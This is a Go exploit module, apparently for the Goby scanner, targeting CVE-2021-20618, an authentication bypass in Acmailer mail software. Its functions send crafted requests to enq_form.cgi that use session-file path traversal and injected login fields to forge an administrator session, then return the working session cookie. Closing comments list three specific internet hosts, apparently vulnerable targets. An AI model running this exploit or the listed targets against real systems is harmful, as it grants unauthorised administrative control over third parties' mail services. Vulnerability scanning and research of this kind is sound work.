package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Acmailer enq_form.cgi Authentication Bypass Vulnerability (CVE-2021-20618)",
    "Description": "<p>Acmailer is a CGI software used to support mail services.</p><p>Acmailer 4.0.2 and earlier versions have security vulnerabilities, which allow remote attackers to bypass authentication and gain administrative privileges.</p>",
    "Product": "acmailer",
    "Homepage": "https://www.acmailer.jp/",
    "DisclosureDate": "2020-12-17",
    "Author": "h1ei1",
    "FofaQuery": "body=\"CGI acmailer\"",
    "GobyQuery": "body=\"CGI acmailer\"",
    "Level": "2",
    "Impact": "<p>Acmailer 4.0.2 and earlier versions have security vulnerabilities, which allow remote attackers to bypass authentication and gain administrative privileges.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.acmailer.jp/info/de.cgi?id=98\">https://www.acmailer.jp/info/de.cgi?id=98</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2021-20618"
    ],
    "CNNVD": [
        "CNNVD-202101-1148"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Acmailer 邮件系统 enq_form.cgi 认证绕过漏洞（CVE-2021-20618）",
            "Product": "acmailer-邮件系统",
            "Description": "<p>Acmailer 是一款用于支持邮件服务的CGI软件。<br></p><p>Acmailer 4.0.2 版本及之前版本存在安全漏洞，该漏洞允许远程攻击者绕过身份验证，获得管理权限进一步控制系统。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.acmailer.jp/info/de.cgi?id=98\">https://www.acmailer.jp/info/de.cgi?id=98</a><br></p>",
            "Impact": "<p>Acmailer 4.0.2 版本及之前版本存在安全漏洞，该漏洞允许远程攻击者绕过身份验证，获得管理权限进一步控制系统。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Acmailer enq_form.cgi Authentication Bypass Vulnerability (CVE-2021-20618)",
            "Product": "acmailer",
            "Description": "<p>Acmailer is a CGI software used to support mail services.<br></p><p>Acmailer 4.0.2 and earlier versions have security vulnerabilities, which allow remote attackers to bypass authentication and gain administrative privileges.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.acmailer.jp/info/de.cgi?id=98\">https://www.acmailer.jp/info/de.cgi?id=98</a><br></p>",
            "Impact": "<p>Acmailer 4.0.2 and earlier versions have security vulnerabilities, which allow remote attackers to bypass authentication and gain administrative privileges.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10809"
}`

	sendRequest := func(hostInfo *httpclient.FixUrl, session string, name string, password string) bool {
		uri := "/enq_form.cgi"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = fmt.Sprintf("id=../session/.%s&mail_id=;login_id%%3D%s;login_pass%%3D%s&key=CC&reg=DD&answer_= ", session, name, password)
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		if _, err := httpclient.DoHttpRequest(hostInfo, cfg); err == nil {
			uri2 := "/import.cgi"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Cookie", "sid="+session)
			if resp2, err := httpclient.DoHttpRequest(hostInfo, cfg2); err == nil {
				return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "admin_edit.cgi?display=")
			}
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			randSession := strings.ToUpper(goutils.RandomHexString(6))
			randName := strings.ToUpper(goutils.RandomHexString(6))
			randPass := strings.ToUpper(goutils.RandomHexString(6))
			uri := "/enq_form.cgi"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = fmt.Sprintf("id=subaccount&mail_id=AA%%09%s&key=CC&reg=DD&answer_=%s", randName, randPass)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")

			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return sendRequest(u, randSession, randName, randPass) // Call the new function here
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randSession := strings.ToUpper(goutils.RandomHexString(6))
			randName := strings.ToUpper(goutils.RandomHexString(6))
			randPass := strings.ToUpper(goutils.RandomHexString(6))
			uri := "/enq_form.cgi"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = fmt.Sprintf("id=subaccount&mail_id=AA%%09%s&key=CC&reg=DD&answer_=%s", randName, randPass)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")

			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if sendRequest(expResult.HostInfo, randSession, randName, randPass) { // Call the new function here
					expResult.Output = "Cookie: sid=" + randSession
					expResult.Success = true
				}

			}

			return expResult
		},
	))
}
//hunter近一年资产893
//http://49.212.123.92
//https://mailer.yokusul.co.jp
//https://mailmag.pdas.co.jp